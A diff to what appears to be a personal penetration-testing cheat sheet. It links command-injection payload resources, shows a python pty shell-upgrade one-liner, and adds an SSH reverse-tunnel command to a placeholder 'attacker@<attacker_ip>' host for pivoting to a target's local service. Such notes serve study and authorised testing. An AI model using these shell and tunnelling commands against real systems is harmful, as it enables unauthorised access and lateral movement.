@@ -70,7 +70,9 @@ https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/
  -https://netsec.ws/?p=337 - interactive tty
  python3 -c 'import pty;pty.spawn("/bin/bash")'
 
-
+### SSH tunelling
+ - netstat -tulpn - what services are running
+ - ssh -R 9001:127.0.0.1:9001 attacker@<attacker_ip>
 ### command injection 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
 
